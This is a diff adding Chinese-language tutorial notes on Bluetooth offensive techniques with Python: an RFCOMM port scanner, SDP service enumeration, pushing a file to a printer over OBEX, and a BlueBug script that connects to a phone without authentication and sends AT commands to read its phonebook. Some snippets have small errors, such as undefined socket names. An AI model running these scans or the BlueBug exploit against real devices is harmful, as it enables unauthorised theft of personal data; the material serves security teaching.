@@ -523,3 +523,80 @@ def check_bluetooth(bt_addr):
         print("[-] Failed to Detect Bluetooth Device.")
 ```
 
+### 扫描蓝牙 RFCOMM 信道
+
+2004 年的 CeBIT 峰会上，H 和 L 演示了一个他们称为 BlueBug 的蓝牙漏洞（Herfurt，2004）。该漏洞针对的是蓝牙的 RFCOMM 传输协议。RFCOMM 通过蓝牙 L2CAP 协议模拟了 RS232 串行端口。从本质上讲，这会与另一台设备建立一个蓝牙连接，模拟一条普通的串行线缆，使用户能够（在另一台设备上）通过蓝牙打电话、发送短信、读取手机电话簿中的记录，以及转接电话或上网
+
+虽然 RFCOMM 确实也能建立需要认证的加密连接，但厂商有时会忽略掉这一功能，允许（其他）未经认证的用户与设备建立连接。
+
+下面将编写一个扫描器，找出允许未经认证建立 RFCOMM 通道的设备
+
+```python
+from bluetooth import *
+def rf_comm_con(addr, port):
+    sock = BluetoothSocket(RFCOMM)
+    try:
+        sock.connect((addr, port)) 
+		print("[+] RFCOMM Port {} open".format(port))
+        sock.close()
+    except Exception as e:
+        print("[-] RFCOMM Port {} closed".format(port))
+for port in range(1, 30):
+    rf_comm_con("00:16:38:DE:AD:11", port)
+```
+
+通过这个脚本可以扫描出开放的 RFCOMM 端口，但不能判断这些端口提供的都是什么服务。需要使用蓝牙服务发现协议（Bluetooth Service Discovery Protocol）来实现
+
+### 使用蓝牙服务发现协议
+
+蓝牙服务发现协议（Service Discovery Protocol，SDP）提供了一种简便方法，用于描述和枚举蓝牙配置文件的类型以及设备提供的服务。设备的 SDP 配置文件中描述了运行在各个蓝牙协议和端口上的服务。
+
+```python
+from bluetooth import *
+def sdp_browse(addr):
+    services = find_service(address=addr)
+    for service in services:
+        name = service["name"]
+        proto = service["protocol"]
+        port = str(service["port"])
+        print("[+] Found {} on {}:{}".format(name, proto, port))
+sdp_browse("00:16:38:DE:AD:11")
+```
+
+调用函数 `find_service()` 之后返回 record 数组，目标蓝牙设备上的每个服务都对应数组中的一个 record，每个 record 中记录了主机、名称、描述、提供者（provider）、协议、端口、服务类、配置文件和服务 ID。
+
+对象交换（Object Exchange，OBEX）服务允许我们能像使用匿名 FTP 那样匿名地向一个系统中上传（push）和下载（pull）文件
+
+### 用 Python ObexFTP 控制打印机
+
+用 ObexFTP 连接到打印机并上传一个图像文件
+
+```python
+import obexftp
+try:
+    bt_printer = obexftp.client(obexftp.BLUETOOTH)
+    bt_printer.connect("00:16:38:DE:AD:11", 2)
+    bt_printer.put_file("/tmp/ninja.jpg")
+    print("[+] Printed Ninja Image.")
+except:
+    print("[-] Failed to print Ninja Image.")
+```
+
+### 用 Python 利用手机中的 BlueBug 漏洞
+
+BlueBug 会与手机建立一个不需要经过认证的不安全连接，并通过这一连接窃取手机中的信息或直接向手机发送命令。这种攻击通过 RFCOMM 信道发送 AT 命令的方式，远程控制设备。这使得攻击者能读/发短信息、收集个人信息，或强制拨打电话号码。
+
+```python
+import bluetooth
+target_phone = "AA:BB:CC:DD:EE:FF"
+port = 17
+phone_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
+phone_sock.connect((target_phone, port))
+for contact in range(1, 5):
+    at_cmd = "AT+CPBR={}\n".format(contact)
+    phone_sock.send(at_cmd)
+    result = client_sock.recv(1024)
+    print("[+] {}: {}".format(contact, result))
+sock.close()
+```
+
